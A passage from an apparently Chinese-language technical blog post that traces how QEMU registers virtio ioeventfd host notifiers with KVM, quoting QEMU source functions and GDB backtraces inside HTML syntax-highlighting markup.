class="params">(VirtioBusState *bus)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtioBusClass *k = VIRTIO_BUS_GET_CLASS(bus);</span><br><span class="line">    DeviceState *proxy = DEVICE(BUS(bus)-&gt;parent);</span><br><span class="line">    VirtIODevice *vdev = virtio_bus_get_device(bus);</span><br><span class="line">    VirtioDeviceClass *vdc = VIRTIO_DEVICE_GET_CLASS(vdev);</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!k-&gt;ioeventfd_assign || !k-&gt;ioeventfd_enabled(proxy)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -ENOSYS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (bus-&gt;ioeventfd_started) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Only set our notifier if we have ownership.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!bus-&gt;ioeventfd_grabbed) &#123;</span><br><span class="line">        r = vdc-&gt;start_ioeventfd(vdev);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            error_report(<span class="string">&quot;%s: failed. Fallback to userspace (slower).&quot;</span>, __func__);</span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bus-&gt;ioeventfd_started = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtio_device_start_ioeventfd_impl</span><span class="params">(VirtIODevice *vdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtioBusState *qbus = VIRTIO_BUS(qdev_get_parent_bus(DEVICE(vdev)));</span><br><span class="line">    <span class="type">int</span> i, n, r, err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Batch all the host notifiers in a single transaction to avoid</span></span><br><span class="line"><span class="comment">     * quadratic time complexity in address_space_update_ioeventfds().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    memory_region_transaction_begin();</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt; VIRTIO_QUEUE_MAX; n++) &#123;</span><br><span class="line">        VirtQueue *vq = &amp;vdev-&gt;vq[n];</span><br><span class="line">        <span class="keyword">if</span> (!virtio_queue_get_num(vdev, n)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        r = virtio_bus_set_host_notifier(qbus, n, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            err = r;</span><br><span class="line">            <span class="keyword">goto</span> assign_error;</span><br><span class="line">        &#125;</span><br><span class="line">        event_notifier_set_handler(&amp;vq-&gt;host_notifier,</span><br><span class="line">                                   virtio_queue_host_notifier_read);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    memory_region_transaction_commit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其可划分两部分——<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-bus.c#L276"><strong>virtio_bus_set_host_notifier()</strong></a>向kvm注册eventfd、<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/util/main-loop.c#L648"><strong>event_notifier_set_handler()</strong></a>注册等待线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  memory_region_add_eventfd (mr=0x55555820ae80, addr=0, size=0, match_data=false, data=0, e=0x55555821cbb4) at ../../qemu/system/memory.c:2565</span></span><br><span class="line"><span class="comment">//#1  0x0000555555b6f81c in virtio_pci_ioeventfd_assign (d=0x555558209fe0, notifier=0x55555821cbb4, n=0, assign=true) at ../../qemu/hw/virtio/virtio-pci.c:345</span></span><br><span class="line"><span class="comment">//#2  0x0000555555b6df98 in virtio_bus_set_host_notifier (bus=0x555558212450, n=0, assign=true) at ../../qemu/hw/virtio/virtio-bus.c:296</span></span><br><span class="line"><span class="comment">//#3  0x0000555555def47c in virtio_device_start_ioeventfd_impl (vdev=0x5555582124d0) at ../../qemu/hw/virtio/virtio.c:3833</span></span><br><span class="line"><span class="comment">//#4  0x0000555555b6dd54 in virtio_bus_start_ioeventfd (bus=0x555558212450) at ../../qemu/hw/virtio/virtio-bus.c:236</span></span><br><span class="line"><span class="comment">//#5  0x0000555555b6f952 in virtio_pci_start_ioeventfd (proxy=0x555558209fe0) at ../../qemu/hw/virtio/virtio-pci.c:375</span></span><br><span class="line"><span class="comment">//#6  0x0000555555b72cae in virtio_pci_common_write (opaque=0x555558209fe0, addr=20, val=15, size=1) at ../../qemu/hw/virtio/virtio-pci.c:1732</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e19a00 in memory_region_write_accessor (mr=0x55555820ab20, addr=20, value=0x7ffff65ff5d8, size=1, shift=0, mask=255, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e19d39 in access_with_adjusted_size (addr=20, value=0x7ffff65ff5d8, size=1, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x55555820ab20, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x55555820ab20, addr=20, data=15, op=MO_8, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f89028 &quot;\017&quot;, len=1, mr_addr=20, l=0x7ffff65ff6c0, mr=0x55555820ab20) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee8000c10, addr=30786325594132, attrs=..., ptr=0x7ffff7f89028, len=1, mr_addr=20, l=1, mr=0x55555820ab20) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e2b982 in flatview_write (fv=0x7ffee8000c10, addr=30786325594132, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e2bdd0 in address_space_write (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325594132, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e2be4c in address_space_rw (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325594132, attrs=..., buf=0x7ffff7f89028, len=1, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e85e36 in kvm_cpu_exec (cpu=0x5555573b4110) at ../../qemu/accel/kvm/kvm-all.c:2912</span></span><br><span class="line"><span class="comment">//#16 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573b4110) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#17 0x00005555560b2687 in qemu_thread_start (args=0x5555573bd220) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#19 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">virtio_bus_set_host_notifier</span><span class="params">(VirtioBusState *bus, <span class="type">int</span> n, <span class="type">bool</span> assign)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIODevice *vdev = virtio_bus_get_device(bus);</span><br><span class="line">    VirtioBusClass *k = VIRTIO_BUS_GET_CLASS(bus);</span><br><span class="line">    DeviceState *proxy = DEVICE(BUS(bus)-&gt;parent);</span><br><span class="line">    VirtQueue *vq = virtio_get_queue(vdev, n);</span><br><span class="line">    EventNotifier *notifier = virtio_queue_get_host_notifier(vq);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    r = event_notifier_init(notifier, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (r &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        error_report(<span class="string">&quot;%s: unable to init event notifier: %s (%d)&quot;</span>,</span><br><span class="line">                     __func__, strerror(-r), r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    r = k-&gt;ioeventfd_assign(proxy, notifier, n, <span class="literal">true</span>);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_notifier_init</span><span class="params">(EventNotifier *e, <span class="type">int</span> active)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fds[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = eventfd(<span class="number">0</span>, EFD_NONBLOCK | EFD_CLOEXEC);</span><br><span class="line">    ...</span><br><span class="line">    e-&gt;rfd = e-&gt;wfd = ret;</span><br><span class="line">    e-&gt;initialized = <span class="literal">true</span>;</span><br><span class="line">    event_notifier_set(e);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">event_notifier_set</span><span class="params">(EventNotifier *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">uint64_t</span> value = <span class="number">1</span>;</span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ret = write(e-&gt;wfd, &amp;value, <span class="keyword">sizeof</span>(value));</span><br><span class="line">    &#125; <span class="keyword">while</span> (ret &lt; <span class="number">0</span> &amp;&amp; errno == EINTR);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">virtio_pci_ioeventfd_assign</span><span class="params">(DeviceState *d, EventNotifier *notifier,</span></span><br><span class="line"><span class="params">                                       <span class="type">int</span> n, <span class="type">bool</span> assign)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOPCIProxy *proxy = to_virtio_pci_proxy(d);</span><br><span class="line">    VirtIODevice *vdev = virtio_bus_get_device(&amp;proxy-&gt;bus);</span><br><span class="line">    VirtQueue *vq = virtio_get_queue(vdev, n);</span><br><span class="line">    <span class="type">bool</span> modern = virtio_pci_modern(proxy);</span><br><span class="line">    MemoryRegion *modern_mr = &amp;proxy-&gt;notify.mr;</span><br><span class="line">    hwaddr modern_addr = virtio_pci_queue_mem_mult(proxy) *</span><br><span class="line">                         virtio_get_queue_index(vq);</span><br><span class="line">    hwaddr legacy_addr = VIRTIO_PCI_QUEUE_NOTIFY;</span><br><span class="line">    ...</span><br><span class="line">    memory_region_add_eventfd(modern_mr, modern_addr, <span class="number">0</span>,</span><br><span class="line">                              <span class="literal">false</span>, n, notifier);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">memory_region_add_eventfd</span><span class="params">(MemoryRegion *mr,</span></span><br><span class="line"><span class="params">                               hwaddr addr,</span></span><br><span class="line"><span class="params">                               <span class="type">unsigned</span> size,</span></span><br><span class="line"><span class="params">                               <span class="type">bool</span> match_data,</span></span><br><span class="line"><span class="params">                               <span class="type">uint64_t</span> data,</span></span><br><span class="line"><span class="params">                               EventNotifier *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegionIoeventfd mrfd = &#123;</span><br><span class="line">        .addr.start = int128_make64(addr),</span><br><span class="line">        .addr.size = int128_make64(size),</span><br><span class="line">        .match_data = match_data,</span><br><span class="line">        .data = data,</span><br><span class="line">        .e = e,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size) &#123;</span><br><span class="line">        adjust_endianness(mr, &amp;mrfd.data, size_memop(size) | MO_TE);</span><br><span class="line">    &#125;</span><br><span class="line">    memory_region_transaction_begin();</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mr-&gt;ioeventfd_nb; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (memory_region_ioeventfd_before(&amp;mrfd, &amp;mr-&gt;ioeventfds[i])) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++mr-&gt;ioeventfd_nb;</span><br><span class="line">    mr-&gt;ioeventfds = g_realloc(mr-&gt;ioeventfds,</span><br><span class="line">                                  <span class="keyword">sizeof</span>(*mr-&gt;ioeventfds) * mr-&gt;ioeventfd_nb);</span><br><span class="line">    memmove(&amp;mr-&gt;ioeventfds[i+<span class="number">1</span>], &amp;mr-&gt;ioeventfds[i],</span><br><span class="line">            <span class="keyword">sizeof</span>(*mr-&gt;ioeventfds) * (mr-&gt;ioeventfd_nb<span class="number">-1</span> - i));</span><br><span class="line">    mr-&gt;ioeventfds[i] = mrfd;</span><br><span class="line">    ioeventfd_update_pending |= mr-&gt;enabled;</span><br><span class="line">    memory_region_transaction_commit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//#0  kvm_set_ioeventfd_mmio (fd=28, addr=481036349440, val=0, assign=true, size=0, datamatch=false) at ../../qemu/accel/kvm/kvm-all.c:1187</span></span><br><span class="line"><span class="comment">//#1  0x0000555555e8764a in kvm_mem_ioeventfd_add (listener=0x555557101240, section=0x7ffff65ff290, match_data=false, data=0, e=0x5555580d4334) at ../../qemu/accel/kvm/kvm-all.c:1655</span></span><br><span class="line"><span class="comment">//#2  0x0000555555e1f689 in address_space_add_del_ioeventfds (as=0x555557055ee0 &lt;address_space_memory&gt;, fds_new=0x7ffee0417450, fds_new_nb=5, fds_old=0x7ffee00533a0, fds_old_nb=2) at ../../qemu/system/memory.c:818</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e1fa13 in address_space_update_ioeventfds (as=0x555557055ee0 &lt;address_space_memory&gt;) at ../../qemu/system/memory.c:883</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e208e4 in memory_region_transaction_commit () at ../../qemu/system/memory.c:1140</span></span><br><span class="line"><span class="comment">//#5  0x0000555555df3d83 in virtio_device_start_ioeventfd_impl (vdev=0x5555580c6260) at ../../qemu/hw/virtio/virtio.c:3850</span></span><br><span class="line"><span class="comment">//#6  0x0000555555b70194 in virtio_bus_start_ioeventfd (bus=0x5555580c61e0) at ../../qemu/hw/virtio/virtio-bus.c:236</span></span><br><span class="line"><span class="comment">//#7  0x0000555555b71d92 in virtio_pci_start_ioeventfd (proxy=0x5555580bdd70) at ../../qemu/hw/virtio/virtio-pci.c:375</span></span><br><span class="line"><span class="comment">//#8  0x0000555555b750ee in virtio_pci_common_write (opaque=0x5555580bdd70, addr=20, val=15, size=1) at ../../qemu/hw/virtio/virtio-pci.c:1732</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e1e25a in memory_region_write_accessor (mr=0x5555580be8b0, addr=20, value=0x7ffff65ff5d8, size=1, shift=0, mask=255, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e1e593 in access_with_adjusted_size (addr=20, value=0x7ffff65ff5d8, size=1, access_size_min=1, access_size_max=4, access_fn=0x555555e1e160 &lt;memory_region_write_accessor&gt;, mr=0x5555580be8b0, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e218ad in memory_region_dispatch_write (mr=0x5555580be8b0, addr=20, data=15, op=MO_8, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e2fffa in flatview_write_continue_step (attrs=..., buf=0x7ffff7f89028 &quot;\017&quot;, len=1, mr_addr=20, l=0x7ffff65ff6c0, mr=0x5555580be8b0) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e300ca in flatview_write_continue (fv=0x7ffee80eb500, addr=481036337172, attrs=..., ptr=0x7ffff7f89028, len=1, mr_addr=20, l=1, mr=0x5555580be8b0) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e301dc in flatview_write (fv=0x7ffee80eb500, addr=481036337172, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e3062a in address_space_write (as=0x555557055ee0 &lt;address_space_memory&gt;, addr=481036337172, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#16 0x0000555555e306a6 in address_space_rw (as=0x555557055ee0 &lt;address_space_memory&gt;, addr=481036337172, attrs=..., buf=0x7ffff7f89028, len=1, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#17 0x0000555555e8a690 in kvm_cpu_exec (cpu=0x5555573bc6a0) at ../../qemu/accel/kvm/kvm-all.c:2912</span></span><br><span class="line"><span class="comment">//#18 0x0000555555e8d712 in kvm_vcpu_thread_fn (arg=0x5555573bc6a0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#19 0x00005555560b6f08 in qemu_thread_start (args=0x5555573c5850) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#20 0x00007ffff7694ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#21 0x00007ffff7726850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">address_space_update_ioeventfds</span><span class="params">(AddressSpace *as)</span></span><br><span class="line">&#123;</span><br><span class="line">    FlatView *view;</span><br><span class="line">    FlatRange *fr;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_max;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">    AddrRange tmp;</span><br><span class="line">    <span class="type">unsigned</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!as-&gt;ioeventfd_notifiers) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * It is likely that the number of ioeventfds hasn&#x27;t changed much, so use</span></span><br><span class="line"><span class="comment">     * the previous size as the starting value, with some headroom to avoid</span></span><br><span class="line"><span class="comment">     * gratuitous reallocations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ioeventfd_max = QEMU_ALIGN_UP(as-&gt;ioeventfd_nb, <span class="number">4</span>);</span><br><span class="line">    ioeventfds = g_new(MemoryRegionIoeventfd, ioeventfd_max);</span><br><span class="line"></span><br><span class="line">    view = address_space_get_flatview(as);</span><br><span class="line">    FOR_EACH_FLAT_RANGE(fr, view) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; fr-&gt;mr-&gt;ioeventfd_nb; ++i) &#123;</span><br><span class="line">            tmp = addrrange_shift(fr-&gt;mr-&gt;ioeventfds[i].addr,</span><br><span class="line">                                  int128_sub(fr-&gt;addr.start,</span><br><span class="line">                                             int128_make64(fr-&gt;offset_in_region)));</span><br><span class="line">            <span class="keyword">if</span> (addrrange_intersects(fr-&gt;addr, tmp)) &#123;</span><br><span class="line">                ++ioeventfd_nb;</span><br><span class="line">                <span class="keyword">if</span> (ioeventfd_nb &gt; ioeventfd_max) &#123;</span><br><span class="line">                    ioeventfd_max = MAX(ioeventfd_max * <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">                    ioeventfds = g_realloc(ioeventfds,</span><br><span class="line">                            ioeventfd_max * <span class="keyword">sizeof</span>(*ioeventfds));</span><br><span class="line">                &#125;</span><br><span class="line">                ioeventfds[ioeventfd_nb<span class="number">-1</span>] = fr-&gt;mr-&gt;ioeventfds[i];</span><br><span class="line">                ioeventfds[ioeventfd_nb<span class="number">-1</span>].addr = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    address_space_add_del_ioeventfds(as, ioeventfds, ioeventfd_nb,</span><br><span class="line">                                     as-&gt;ioeventfds, as-&gt;ioeventfd_nb);</span><br><span class="line"></span><br><span class="line">    g_free(as-&gt;ioeventfds);</span><br><span class="line">    as-&gt;ioeventfds = ioeventfds;</span><br><span class="line">    as-&gt;ioeventfd_nb = ioeventfd_nb;</span><br><span class="line">    flatview_unref(view);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">address_space_add_del_ioeventfds</span><span class="params">(AddressSpace *as,</span></span><br><span class="line"><span class="params">                                             MemoryRegionIoeventfd *fds_new,</span></span><br><span class="line"><span class="params">                                             <span class="type">unsigned</span> fds_new_nb,</span></span><br><span class="line"><span class="params">                                             MemoryRegionIoeventfd *fds_old,</span></span><br><span class="line"><span class="params">                                             <span class="type">unsigned</span> fds_old_nb)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> iold, inew;</span><br><span class="line">    MemoryRegionIoeventfd *fd;</span><br><span class="line">    MemoryRegionSection section;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Generate a symmetric difference of the old and new fd sets, adding</span></span><br><span class="line"><span class="comment">     * and deleting as necessary.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    iold = inew = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (iold &lt; fds_old_nb || inew &lt; fds_new_nb) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iold &lt; fds_old_nb</span><br><span class="line">            &amp;&amp; (inew == fds_new_nb</span><br><span class="line">                || memory_region_ioeventfd_before(&amp;fds_old[iold],</span><br><span class="line">                                                  &amp;fds_new[inew]))) &#123;</span><br><span class="line">            fd = &amp;fds_old[iold];</span><br><span class="line">            section = (MemoryRegionSection) &#123;</span><br><span class="line">                .fv = address_space_to_flatview(as),</span><br><span class="line">                .offset_within_address_space = int128_get64(fd-&gt;addr.start),</span><br><span class="line">                .size = fd-&gt;addr.size,</span><br><span class="line">            &#125;;</span><br><span class="line">            MEMORY_LISTENER_CALL(as, eventfd_del, Forward, &amp;section,</span><br><span class="line">                                 fd-&gt;match_data, fd-&gt;data, fd-&gt;e);</span><br><span class="line">            ++iold;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inew &lt; fds_new_nb</span><br><span class="line">                   &amp;&amp; (iold == fds_old_nb</span><br><span class="line">                       || 